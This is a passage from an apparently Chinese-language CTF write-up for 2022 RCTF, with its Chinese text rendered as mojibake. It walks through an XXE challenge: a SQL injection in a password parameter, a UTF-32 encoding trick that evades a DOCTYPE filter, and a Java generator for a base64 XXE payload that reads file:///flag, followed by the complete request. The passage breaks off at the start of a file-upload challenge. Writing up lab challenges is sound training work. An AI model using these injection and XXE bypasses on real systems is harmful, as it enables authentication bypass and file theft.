<p><code>password=1</code><strong><code>$&#123;@java.lang.Character@toString(39)&#125;</code></strong><code>) or 1=1#</code></p>
</blockquote>
<h3 id="pocå‚æ•°"><a href="#pocå‚æ•°" class="headerlink" title="pocå‚æ•°"></a>pocå‚æ•°</h3><p>å…ˆåˆ†æä¸€ä¸‹<code>xxe</code>å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">xxe</span><span class="params">(String b64poc, String type, String[] classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br><span class="line">    <span class="keyword">if</span> (check(bytepoc)) &#123;</span><br><span class="line">      <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">      <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">      <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">wrappoc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br><span class="line">      <span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br><span class="line">      inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br><span class="line">      <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>poc</code>ä¼ å…¥åå˜ä¸º<code>b64poc</code></p>
<p>ç„¶å<code>b64poc</code>è¿›è¡Œ<code>base64</code>è§£ç ï¼Œç„¶å<code>check</code>å‡½æ•°è¿›è¡Œè¿‡æ»¤<code>!DOCTYPE</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æåŠä¸€ä¸ªçŸ¥è¯†ç‚¹xxeçš„ç¼–ç ç»•è¿‡</p>
<blockquote>
<p>ä¸€ä¸ª xml æ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨ UTF-8 ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨ UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBE å’Œ LE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412) å’Œ EBCDIC ç¼–ç ã€‚</p>
</blockquote>
<p>è€Œä¸€èˆ¬è¿‡æ»¤éƒ½æ˜¯å•å­—ç¬¦é›†è¿‡æ»¤ï¼Œåˆ©ç”¨ä¸Šé¢çš„ç¼–ç å°±å¯ä»¥ç»•è¿‡ï¼Œè€Œä¸”åˆ©ç”¨ä¸Šé¢æ–¹å¼åŠ ç çš„<code>xml</code>æ–‡æ¡£ä»ç„¶å¯ä»¥è¢«æ­£å¸¸è¯»å–è§£æï¼Œ</p>
<p>è¿™é‡Œå°†å…¶è¿›è¡Œ<code>UTF-16</code>åŠ ç ï¼Œäºæ˜¯æ„é€ payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE test [ \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;\t&lt;!ENTITY xxe SYSTEM \&quot;file:///flag\&quot;&gt; \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;]&gt; \n&quot;</span>y</span><br><span class="line">                + <span class="string">&quot;&lt;ttoc&gt;&amp;xxe;&lt;/ttoc&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> <span class="string">&quot;UTF-32&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(body.getBytes(type)));</span><br><span class="line">        System.out.println(<span class="string">&quot;poc=&quot;</span>+poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åå¾—åˆ°<code>poc</code>çš„å‚æ•°å€¼</p>
<blockquote>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA+AAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg==</code></p>
<p>ä½†æ˜¯å‘é€è¯·æ±‚åŒ…ä¸­<code>base64</code>ç¼–ç ï¼Œéœ€è¦å¯¹æ•°æ®å†è¿›è¡Œ<code>url</code>ç¼–ç ï¼Œä¸ç„¶ç±»å‹<code>=</code>æˆ–<code>+</code>ä¼šè¢«è§†ä¸º<code>url</code>ä¸­çš„å‚æ•°å’Œç©ºæ ¼ç¬¦å·</p>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D</code></p>
</blockquote>
<h3 id="typeå‚æ•°"><a href="#typeå‚æ•°" class="headerlink" title="typeå‚æ•°"></a>typeå‚æ•°</h3><p>åœ¨<code>xxe</code>å‡½æ•°ä¸­ï¼Œå¯¹äº<code>type</code>å‚æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br></pre></td></tr></table></figure>

<p>ä¼¼ä¹å¯¹äºç»“æœæ²¡ä»€ä¹ˆå½±å“ï¼Œåªæ˜¯å¯¹<code>type</code>å‚æ•°å€¼ä¸ºä¸ä¸º<code>string</code>æ—¶ï¼Œå¯¹<code>wrappoc</code>å€¼æœ‰å˜åŒ–ã€æ˜¯<code>byte</code>ç±»å‹çš„<code>poc</code>å‚æ•°å€¼ï¼Œè¿˜æ˜¯<code>string</code>ç±»å‹çš„<code>poc</code>å‚æ•°å€¼ã€‘</p>
<p>ä½†æ˜¯<code>wrappoc</code>å‚æ•°å¯¹åç»­ç»“æœæ²¡ç”¨å½±å“ï¼ŒçŒœæµ‹<code>type</code>å‚æ•°å€¼åº”è¯¥å¯ä»¥é¡ºä¾¿å¡«ï¼Œå°±æŒ‰å…¶ä»£ç èµ‹å€¼ä¹Ÿè¡Œ</p>
<blockquote>
<p><code>type=string</code></p>
</blockquote>
<h3 id="yourclasseså‚æ•°"><a href="#yourclasseså‚æ•°" class="headerlink" title="yourclasseså‚æ•°"></a>yourclasseså‚æ•°</h3><p><code>yourclasses</code>å‚æ•°ä¼ å…¥<code>xxe</code>å‡½æ•°æ—¶ï¼Œä»¥<code>classes</code>å‚æ•°å</p>
<p>å‰é¢æåˆ°è¿‡,<code>yourclasses</code>å‚æ•°ä»¥<code>,</code>ä¸ºåˆ†å‰²ï¼Œåˆ†æˆå››ä»½</p>
<p>å‰ä¸¤éƒ¨åˆ†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>åä¸¤éƒ¨åˆ†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>å…ˆåˆ†æä¸€ä¸‹</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/"><strong>java.lang.Class ç±»</strong></a>çš„**forName()**æ–¹æ³•ç”¨äºè·å–å…·æœ‰æŒ‡å®šç±»åçš„è¯¥ç±»çš„å®ä¾‹ã€‚æ­¤ç±»åç§°æŒ‡å®šä¸ºå­—ç¬¦ä¸²å‚æ•°</p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œ<strong>Class.forName</strong> æ–¹æ³•çš„ä½œç”¨ï¼Œå°±æ˜¯åˆå§‹åŒ–ç»™å®šçš„ç±»ã€‚</p>
</blockquote>
<h4 id="classes-0-classes-1"><a href="#classes-0-classes-1" class="headerlink" title="classes[0]&amp;classes[1]"></a>classes[0]&amp;classes[1]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç ä½¿ç”¨äº†åå°„æœºåˆ¶ã€‚å®ƒé¦–å…ˆä½¿ç”¨ <code>Class.forName(classes[0])</code> æ–¹æ³•æ¥è·å–ç±»çš„ <code>Class</code> å¯¹è±¡ã€‚</p>
<p>ç„¶åä½¿ç”¨ <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;)</code> æ–¹æ³•æ¥è·å–è¯¥ç±»çš„æ„é€ å‡½æ•°ã€‚</p>
<p>è¯¥æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ª <code>Class</code> æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚åœ¨è¿™é‡Œï¼Œè¯¥æ„é€ å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œä¸”å…¶å‚æ•°çš„ç±»å‹æ˜¯ <code>classes[1]</code> ä¸­æ‰€è¡¨ç¤ºçš„ç±»ã€‚æœ€åå°†è·å–åˆ°çš„æ„é€ å‡½æ•°èµ‹å€¼ç»™ <code>constructor</code> å˜é‡ã€‚</p>
<blockquote>
<p>åå°„æœºåˆ¶æ˜¯ Java ç¼–ç¨‹è¯­è¨€ä¸­ä¸€ç§ç”¨äºè·å–ç±»ã€æ¥å£ã€æ„é€ æ–¹æ³•ã€å­—æ®µã€æ–¹æ³•ç­‰ä¿¡æ¯çš„æœºåˆ¶ã€‚åå°„æœºåˆ¶å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–ã€ä½¿ç”¨ã€æ“ä½œç±»çš„ç›¸å…³ä¿¡æ¯ã€‚</p>
</blockquote>
</blockquote>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<blockquote>
<p><code>classes[0]</code>ï¼š</p>
<p>è¿™ä¸ªæ˜¯çœ‹å…¶ä»–å¤§ä½¬wpæ¸…æ¥šäº†ï¼Œè¿™é‡Œèµ‹å€¼å­—èŠ‚æ•°ç»„ <code>java.io.ByteArrayInputStream</code>,ç„¶å<code>bytepoc</code>é€šè¿‡<strong>ByteArrayInputStreamè½¬æ¢ä¸ºè¾“å…¥æµ</strong>ï¼Œå› ä¸ºå…¶ç±»ä¸­æœ‰<code>read()</code>å¯ä»¥è¯»å–æ•°æ®</p>
<p><code>classes[1]</code>ï¼š</p>
<p>æ˜¯æ•°ç»„å‚æ•°æ•°æ®ç±»å‹ï¼Œæ ¹æ®æ•°ç»„å‚æ•°ç±»å‹â€<code>[B</code>â€œ æ˜¯è¡¨ç¤ºå­—èŠ‚æ•°ç»„<code>byte[]</code> (byte array) çš„ç±»å‹åç§°ã€‚</p>
<blockquote>
<p>åœ¨ java ä¸­ï¼Œæ•°ç»„ç±»å‹çš„ç±»å‹åç§°ä¼šåœ¨å‰é¢åŠ ä¸Š â€œ[â€œ ç¬¦å·è¡¨ç¤ºï¼Œæ¯”å¦‚<code>[I</code>ä»£è¡¨ int ç±»å‹çš„æ•°ç»„ç±»å‹åç§°ï¼Œä½†æ˜¯ç”±äºstringä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œåªèƒ½ç”¨ç±»è¡¨ç¤º<code>[Ljava.lang.String;</code></p>
</blockquote>
</blockquote>
<p><strong>æ‰€ä»¥</strong></p>
<blockquote>
<p><code>classes[0]=java.io.ByteArrayInputStream</code></p>
<p><code>classes[1]=[B</code>   (å› ä¸º<code>bytepoc</code>ä¸º<code>byte</code>æ•°æ®ç±»å‹ï¼Œæ‰€ä»¥è¿™é‡Œä¼ å…¥<code>ByteArrayInputStream</code>ç±»ä¸­çš„æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ä¹Ÿå£°æ˜ä¸º<code>byte</code></p>
</blockquote>
<h4 id="classes-2-classes-3"><a href="#classes-2-classes-3" class="headerlink" title="classes[2]&amp;classes[3]"></a>classes[2]&amp;classes[3]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„<code>inputSource</code>å‚æ•°æ˜¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line">...</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>



<p>è¿™æ®µä»£ç é¦–å…ˆä½¿ç”¨ <code>Class.forName(classes[2])</code> æ–¹æ³•æ¥è·å–ç¬¬ä¸‰ä¸ªå‚æ•°æ‰€è¡¨ç¤ºçš„ç±»çš„ <code>Class</code> å¯¹è±¡ï¼Œåœ¨è¿™é‡Œæ˜¯ <code>org.xml.sax.InputSource</code> ç±»ï¼Œè¿™ä¸ªç±»æ˜¯ <code>SAX (Simple API for XML)</code> ä¸­ç”¨äºè¯»å– <code>XML</code> æ–‡æ¡£çš„ä¸€ä¸ªç±»ã€‚</p>
<p>ç„¶åä½¿ç”¨ <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;)</code> æ–¹æ³•æ¥è·å–è¯¥ç±»çš„æ„é€ å‡½æ•°ï¼Œåœ¨è¿™é‡Œæ˜¯ <code>org.xml.sax.InputSource</code> ç±»çš„æ„é€ å‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªå‚æ•°æ˜¯ <code>classes[3]</code> æ‰€è¡¨ç¤ºçš„ç±»ã€‚</p>
<p>ä¹‹åä½¿ç”¨ <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ª <code>org.xml.sax.InputSource</code> ç±»å‹çš„å®ä¾‹ï¼Œä½¿ç”¨å‚æ•°å€¼ä¸º <code>wrappoc</code> çš„æ„é€ å‡½æ•°æ¥åˆ›å»ºè¿™ä¸ªå®ä¾‹ã€‚</p>
<p>æ¥ç€ä½¿ç”¨ <code>builder.parse(inputSource)</code> æ–¹æ³•æ¥è§£æ <code>inputSource</code> å¯¹è±¡ï¼Œè¿™é‡Œçš„ <code>builder</code> æ˜¯ <code>DocumentBuilder</code> ç±»å‹çš„å¯¹è±¡ï¼Œ<code>DocumentBuilder</code> æ˜¯ <code>javax.xml.parsers</code> åŒ…ä¸­æä¾›çš„ä¸€ä¸ªç±»ï¼Œå…¶ä½œç”¨æ˜¯åˆ›å»º <strong>DOM è§£æå™¨</strong>ï¼Œç”¨äº<code>è§£æ XML æ–‡æ¡£</code></p>
<p>&#x3D;&#x3D;&gt;</p>
<p><code>inputSource</code>å€¼ä¸ºæ¶æ„xmlæ–‡ä»¶å†…å®¹</p>
<p><code>doc</code>å€¼ä¸ºè§£ææ¶æ„xmlæ–‡ä»¶åå¾—åˆ°çš„å†…å®¹</p>
</blockquote>
<p>åœ¨ä»£ç è¿˜æœ‰ä¸€æ®µå®ç°æ‰“å°çš„ä»£ç ï¼Œè¿™æ®µä»£ç å°±å®Œæˆäº†æŠŠ<code>doc</code>ä¸­è§£ææ¶æ„xmlæ–‡æ¡£åå¾—åˆ°çš„å†…å®¹ï¼Œæ‰“å°è¾“å‡º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™æ®µä»£ç é¦–å…ˆä½¿ç”¨ <code>doc.getChildNodes()</code> æ–¹æ³•è·å–æ–‡æ¡£ä¸­çš„æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨ <code>NodeList</code> å¯¹è±¡ä¸­ã€‚</p>
<p>ç„¶åä½¿ç”¨ä¸€ä¸ª <code>for</code> å¾ªç¯æ¥éå† <code>NodeList</code> ä¸­çš„æ¯ä¸ªå­èŠ‚ç‚¹ã€‚åœ¨æ¯æ¬¡å¾ªç¯ä¸­ï¼Œä½¿ç”¨ <code>nodes.item(i)</code> æ–¹æ³•è·å–å½“å‰éå†åˆ°çš„å­èŠ‚ç‚¹ã€‚</p>
<p>ä¹‹åä½¿ç”¨ <code>if</code> è¯­å¥æ¥æ£€æŸ¥å½“å‰å­èŠ‚ç‚¹çš„ç±»å‹ã€‚å¦‚æœè¯¥ç±»å‹ä¸º<code>1</code> (å³å…ƒç´ èŠ‚ç‚¹)ï¼Œåˆ™ä½¿ç”¨ <code>nodes.item(i).getTextContent()</code> æ–¹æ³•è·å–è¯¥å…ƒç´ èŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹å¹¶å°†å…¶åŠ åˆ° <code>res</code> å˜é‡ä¸­ã€‚ç„¶åä½¿ç”¨ <code>System.out.println(nodes.item(i).getTextContent())</code> æ–¹æ³•å°†è¯¥æ–‡æœ¬å†…å®¹æ‰“å°åˆ°æ§åˆ¶å°ã€‚</p>
<p><strong>æ€»çš„æ¥è¯´</strong>ï¼Œè¿™æ®µä»£ç ç”¨äºéå†æ–‡æ¡£ä¸­æ‰€æœ‰å­èŠ‚ç‚¹ï¼Œå¹¶å°†æ‰€æœ‰å…ƒç´ èŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹æå–å‡ºæ¥å¹¶å­˜å‚¨åœ¨ res å˜é‡ä¸­ï¼ŒåŒæ—¶å°†å…¶æ‰“å°åˆ°æ§åˆ¶å°ã€‚</p>
<p>è¿™æ®µä»£ç é€šè¿‡éå†<code>doc</code>ä¸­çš„æ‰€æœ‰å­èŠ‚ç‚¹,å¹¶å°†æ‰€æœ‰å…ƒç´ èŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹è·å–å‡ºæ¥å¹¶å­˜å‚¨åœ¨<code>res</code>å˜é‡ä¸­,åŒæ—¶å°†å…¶æ‰“å°åˆ°æ§åˆ¶å°(è¿™æ®µä»£ç åœ¨çˆ¬è™«é¢†åŸŸå¾ˆå¸¸ç”¨æ¥æå–ç½‘é¡µä¸­çš„æ–‡æœ¬å†…å®¹)</p>
</blockquote>
<p><strong>æ‰€ä»¥</strong></p>
<blockquote>
<p><code>classes[2]=org.xml.sax.InputSource</code></p>
<p>&#x2F;&#x2F;è¿™é‡Œä¸º<code>org.xml.sax.InputSource</code>ç±»ï¼Œç”¨äºè¯»å–xmlæ–‡ä»¶ï¼Œå°†å…¶è½¬åŒ–ä¸ºå¯è§£æçš„xmlæ ¼å¼ï¼Œä¾¿äºåé¢è¿›è¡Œ</p>
<p><code>classes[3]=java.io.InputStream</code>     </p>
<p>&#x2F;&#x2F;<code>java.io.ByteArrayInputStream</code>æ˜¯<code>java.io.InputStream</code>çš„å­ç±»ï¼Œä½†æ˜¯<code>java.io.ByteArrayInputStream</code>ä¸èƒ½ç›´æ¥ä½œä¸ºæ„é€ å‡½æ•°çš„å‚æ•°ä¼ å…¥ <code>org.xml.sax.InputSource</code> ç±»çš„æ„é€ å‡½æ•°,å› ä¸º<code>org.xml.sax.InputSource</code>å’Œ <code>java.io.InputStream</code> ä¹‹é—´å¹¶æ²¡æœ‰ç»§æ‰¿å…³ç³»ã€‚</p>
<p>&#x2F;&#x2F;å¦‚æœ<code>classes[3]=java.io.ByteArrayInputStream</code>ï¼Œä¼šå¯¼è‡´ç¨‹åºåœ¨æ‰§è¡Œ <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> æ–¹æ³•æ—¶å‡ºç°å¼‚å¸¸,å› ä¸ºç±»å‹ä¸åŒ¹é…ï¼Œ</p>
<p>é™¤é<code>ByteArrayInputStream</code>è½¬æ¢ä¸º<code>InputStream</code> ç±»å‹çš„å¯¹è±¡æ‰èƒ½ä¼ å…¥ <code>org.xml.sax.InputSource</code> ç±»çš„æ„é€ å‡½æ•°</p>
</blockquote>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote>
<p><code>password=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream</code></p>
</blockquote>
<p><img src="/post/2022RCTF/image-20230125004553248.png" alt="image-20230125004553248"></p>
<h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><blockquote>
<p>hint:<code>Just an easy file check challenge~~~</code><br><code>The challenging environment restarts every three minutes</code></p>
<p>åªæ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶æ£€æŸ¥æŒ‘æˆ˜~~~<br>å…·æœ‰æŒ‘æˆ˜æ€§çš„ç¯å¢ƒæ¯ä¸‰åˆ†é’Ÿ</p>
</blockquote>
<p><img src="/post/2022RCTF/image-20230312163758682.png" alt="image-20230312163758682"></p>
<p> ä¼¼ä¹æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç¯å¢ƒï¼Œ</p>
<p>å…ˆåˆ†æä¸€ä¸‹å®ƒçš„ç½‘ç«™å¯åŠ¨è„šæœ¬<code>app.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿ ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿ ãƒ½(=^ï½¥Ï‰ï½¥^=)ä¸¿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span 